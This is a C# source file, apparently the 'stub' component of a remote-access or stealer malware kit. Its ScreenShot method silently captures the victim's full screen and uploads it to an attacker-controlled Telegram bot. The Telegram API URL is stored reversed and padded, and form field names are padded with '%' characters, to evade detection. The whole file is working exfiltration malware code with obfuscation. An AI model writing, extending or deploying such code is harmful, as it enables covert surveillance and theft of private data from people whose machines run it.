using System;
using System.Drawing;
using System.Net.Http;
using System.IO;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Drawing.Imaging;
using System.Threading;
using Stub.Help;

namespace Stub.TelegramAPI
{
    class SendDocument
    {
        public async static void ScreenShot(string message)
        {
            try
            {
                await Task.Run(async () =>
                {
                    if (!Config.tgNotifications)
                        return;
                    else
                        Thread.Sleep(5000);
                    using (Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                    {
                        using (Graphics graphics = Graphics.FromImage(screenshot))
                        {
                            graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);

                            using (MemoryStream ms = new MemoryStream())
                            {
                                screenshot.Save(ms, ImageFormat.Png);

                                SSL.GetSSL();
                                using (HttpClient client = new HttpClient())
                                {
                                    string getToken = await client.GetStringAsync(Config.botToken);
                                    MultipartFormDataContent content = new MultipartFormDataContent
                                    {
                                        { new StringContent(Config.chatId, System.Text.Encoding.UTF8), "c%h%a%t%_%i%d%".Replace("%", "")},
                                        { new StringContent("HTML", System.Text.Encoding.UTF8), "p%a%r%s%e%_%m%o%d%e%".Replace("%", "")},
                                        { new StringContent(message, System.Text.Encoding.UTF8), "%c%a%p%t%i%o%n%".Replace("%", "")},
                                        { new ByteArrayContent(ms.ToArray()), "document".Replace("%", ""), "%S%c%r%%e%e%n%.%p%%n%g%".Replace("%", "") },
                                    };

                                    string url = $"{StringHelper.ReverseString("%t%o%b%/%g%r%o%.%m%a%r%g%e%l%e%t%.%i%p%a%/%/%:%s%p%t%t%h")}{getToken.Replace("%", "").Trim()}/sendDocument".Replace("%", "");
                                   Console.WriteLine(url);
                                    HttpResponseMessage response = await client.PostAsync(url, content);

                                    if (!response.IsSuccessStatusCode)
                                    {
                                        Console.WriteLine(response.StatusCode);
                                    }
                                }
                            }
                        }
                    }
                });
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }

}
